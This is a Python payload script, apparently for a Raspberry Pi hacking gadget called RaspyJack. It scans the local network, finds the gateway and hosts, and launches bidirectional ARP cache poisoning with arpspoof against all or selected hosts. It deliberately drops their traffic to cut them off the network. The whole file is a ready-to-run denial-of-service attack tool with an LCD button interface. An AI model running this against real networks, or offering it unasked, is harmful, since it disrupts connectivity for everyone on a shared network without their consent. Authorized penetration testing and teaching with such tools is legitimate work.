#!/usr/bin/env python3
"""
RaspyJack Payload – ARP Spoof
==============================
Pure ARP cache poisoning that disrupts network communication.
Scans the local network with arp-scan, discovers gateway and hosts,
then launches bidirectional arpspoof for every host.

No IP forwarding, no tcpdump — traffic is simply dropped,
causing network disruption for all poisoned hosts.

Controls
--------
MAIN MENU:
  KEY1 : Scan network
  KEY3 : Exit

HOST LIST (after scan):
  UP / DOWN : Navigate
  KEY1      : Start ARP spoof on all hosts
  KEY2      : Rescan
  KEY3      : Back to main

DURING ATTACK:
  KEY2 : Stop attack
  KEY3 : Exit
"""

import os
import sys
import time
import signal
import subprocess
import re
import threading

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._input_helper import get_button

try:
    import netifaces
except ImportError:
    netifaces = None

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

WIDTH, HEIGHT = 128, 128

# ---------------------------------------------------------------------------
# GPIO & LCD
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 8)
    font_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
except Exception:
    font = font_big = ImageFont.load_default()

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
running = True
arpspoof_procs = []


def cleanup(*_):
    global running
    running = False
    stop_attack()


signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# LCD helpers
# ---------------------------------------------------------------------------

def draw_screen(lines, title=None, highlight_idx=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    y = 2
    if title:
        d.rectangle([0, 0, WIDTH, 13], fill="#1a1a2e")
        d.text((3, 2), title[:20], font=font_big, fill="#00FFFF")
        y = 16
    for i, line in enumerate(lines):
        if highlight_idx is not None and i == highlight_idx:
            d.rectangle([0, y - 1, WIDTH, y + 10], fill="#2d0fff")
            d.text((3, y), line[:21], font=font, fill="#00FF00")
        else:
            d.text((3, y), line[:21], font=font, fill="#FFFFFF")
        y += 11
        if y > HEIGHT - 4:
            break
    LCD.LCD_ShowImage(img, 0, 0)


def draw_centered(text, color="#00FF00"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), text, font=font_big)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    d.text(((WIDTH - w) // 2, (HEIGHT - h) // 2), text, font=font_big, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _is_onboard_wifi(iface):
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def detect_interface():
    """Pick the best wired/wireless interface for ARP spoofing (not the WebUI one)."""
    webui_iface = None
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if name.startswith("wlan") and _is_onboard_wifi(name):
                webui_iface = name
                break
    except Exception:
        pass

    candidates = []
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if name == "lo" or name == webui_iface:
                continue
            carrier = ""
            try:
                with open(f"/sys/class/net/{name}/carrier") as f:
                    carrier = f.read().strip()
            except Exception:
                pass
            if carrier == "1":
                candidates.append(name)
    except Exception:
        pass

    def score(n):
        if n.startswith("wlan"):
            return 0
        if n.startswith("eth"):
            return 1
        if n.startswith("en"):
            return 2
        if n.startswith("usb"):
            return 3
        return 4

    candidates.sort(key=lambda n: (score(n), n))
    return candidates[0] if candidates else "wlan0"

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def get_gateway(interface):
    if netifaces is None:
        return None
    try:
        gateways = netifaces.gateways()
        default_gw = gateways.get("default", {}).get(netifaces.AF_INET)
        if default_gw and default_gw[1] == interface:
            return default_gw[0]
        for gw, iface, _ in gateways.get(netifaces.AF_INET, []):
            if iface == interface:
                return gw
        if default_gw:
            return default_gw[0]
    except Exception:
        pass
    return None


def scan_hosts(interface):
    """Run arp-scan and fping in parallel, merge and deduplicate results by IP."""
    seen = {}
    lock = threading.Lock()

    def run_arp_scan():
        cmd = (
            f"arp-scan --localnet --interface {interface} --quiet "
            f"--retry=3 --timeout=500 --interval=10"
        )
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=60,
            )
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 2 and re.match(r"^\d+\.\d+\.\d+\.\d+$", parts[0]):
                    ip, mac = parts[0], parts[1]
                    with lock:
                        if ip not in seen:
                            seen[ip] = {"ip": ip, "mac": mac}
        except Exception:
            pass

    def run_fping():
        # Get CIDR for this interface (e.g. 192.168.1.0/24) to pass to fping -g
        cidr_cmd = f"ip -4 addr show {interface} | awk '/inet / {{print $2}}'"
        try:
            cidr = subprocess.run(
                cidr_cmd, shell=True, capture_output=True, text=True, timeout=5,
            ).stdout.strip()
        except Exception:
            cidr = ""
        if not cidr:
            return
        cmd = f"fping -a -g {cidr} -t 500 -r 2 -q 2>/dev/null"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30,
            )
            for line in result.stdout.splitlines():
                ip = line.strip()
                if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                    with lock:
                        if ip not in seen:
                            seen[ip] = {"ip": ip, "mac": "??:??:??:??:??:??"}
        except Exception:
            pass

    t1 = threading.Thread(target=run_arp_scan, daemon=True)
    t2 = threading.Thread(target=run_fping, daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    return list(seen.values())

# ---------------------------------------------------------------------------
# Attack control
# ---------------------------------------------------------------------------

def start_attack(interface, targets, gateway_ip):
    """Targets is a list of host dicts (gateway already excluded)."""
    global arpspoof_procs
    stop_attack()

    for host in targets:
        p1 = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", gateway_ip, host["ip"]],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        p2 = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", host["ip"], gateway_ip],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        arpspoof_procs.extend([p1, p2])

    print(f"[*] ARP spoof started: {len(targets)} hosts, {len(arpspoof_procs)} arpspoof procs")


def stop_attack():
    global arpspoof_procs
    for p in arpspoof_procs:
        try:
            p.terminate()
        except Exception:
            pass
    for p in arpspoof_procs:
        try:
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    arpspoof_procs.clear()
    subprocess.run(
        ["pkill", "-f", "arpspoof"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def alive_count():
    return sum(1 for p in arpspoof_procs if p.poll() is None)

# ---------------------------------------------------------------------------
# UI screens
# ---------------------------------------------------------------------------

def screen_main(interface):
    draw_screen(
        [
            f"Interface: {interface}",
            "",
            "KEY1  Scan network",
            "KEY3  Exit",
        ],
        title="ARP Spoof",
    )
    while running:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            return None
        if btn == "KEY1":
            return "scan"
        time.sleep(0.05)
    return None


def screen_host_list(hosts, gateway_ip):
    """Returns (action, selected_hosts) where action is None/'rescan'/'attack'."""
    if not hosts:
        draw_centered("No hosts found!", "#FF0000")
        time.sleep(2)
        return None, []

    all_targets = [h for h in hosts if h["ip"] != gateway_ip]
    if not all_targets:
        draw_centered("No targets!", "#FF0000")
        time.sleep(2)
        return None, []

    sel = 0
    scroll = 0
    VISIBLE = 8
    selected = []  # list of IPs toggled for attack

    def render():
        lines = []
        for h in hosts[scroll:scroll + VISIBLE]:
            if h["ip"] == gateway_ip:
                tag = "GW "
            elif h["ip"] in selected:
                tag = "[*]"
            else:
                tag = "   "
            lines.append(f"{tag}{h['ip']}")
        title = f"Hosts({len(hosts)}) sel:{len(selected)}"
        draw_screen(lines, title=title, highlight_idx=sel - scroll)

    render()

    while running:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            return None, []
        if btn == "KEY2":
            return "rescan", []
        if btn == "KEY1":
            # Attack selected; if nothing selected, attack all targets
            attack_targets = [h for h in all_targets if h["ip"] in selected] or all_targets
            return "attack", attack_targets
        if btn == "OK":
            host = hosts[sel]
            if host["ip"] != gateway_ip:
                if host["ip"] in selected:
                    selected.remove(host["ip"])
                else:
                    selected.append(host["ip"])
                render()
                time.sleep(0.18)
            continue
        if btn == "DOWN":
            sel = min(sel + 1, len(hosts) - 1)
        elif btn == "UP":
            sel = max(sel - 1, 0)
        else:
            time.sleep(0.05)
            continue

        if sel < scroll:
            scroll = sel
        if sel >= scroll + VISIBLE:
            scroll = sel - VISIBLE + 1
        render()
        time.sleep(0.05)
    return None, []


def screen_attack(interface, targets, gateway_ip):
    draw_centered("Starting...", "#FFFF00")
    start_attack(interface, targets, gateway_ip)
    start_time = time.time()

    while running:
        btn = get_button(PINS, GPIO)
        if btn in ("KEY2", "KEY3"):
            stop_attack()
            draw_centered("Attack stopped", "#FFFF00")
            time.sleep(1)
            return

        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)
        alive = alive_count()

        lines = [
            f"Targets: {len(targets)}",
            f"Procs:   {alive}/{len(arpspoof_procs)}",
            f"Gateway: {gateway_ip}",
            f"Iface:   {interface}",
            "",
            f"Time: {mins:02d}:{secs:02d}",
            "",
            "KEY2 stop  KEY3 exit",
        ]
        draw_screen(lines, title="ARP Spoof Active")

        if alive == 0 and len(arpspoof_procs) > 0:
            draw_centered("All procs died!", "#FF0000")
            time.sleep(2)
            stop_attack()
            return

        time.sleep(0.5)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    interface = detect_interface()
    print(f"[*] ARP Spoof payload – interface: {interface}")

    while running:
        action = screen_main(interface)
        if action is None:
            break
        if action != "scan":
            continue

        while running:
            draw_centered("Scanning...", "#FFFF00")
            hosts = scan_hosts(interface)
            gateway_ip = get_gateway(interface)
            print(f"[*] Found {len(hosts)} hosts, gateway: {gateway_ip}")

            if not gateway_ip:
                draw_screen(
                    ["No gateway found!", "", "Check connection", "", "KEY3 back"],
                    title="Error",
                )
                while running:
                    if get_button(PINS, GPIO) == "KEY3":
                        break
                    time.sleep(0.05)
                break

            result, attack_targets = screen_host_list(hosts, gateway_ip)
            if result is None:
                break
            if result == "rescan":
                continue
            if result == "attack":
                screen_attack(interface, attack_targets, gateway_ip)


try:
    main()
except Exception as exc:
    print(f"[ARP Spoof] FATAL: {exc}", file=sys.stderr)
finally:
    stop_attack()
    LCD.LCD_Clear()
    GPIO.cleanup()
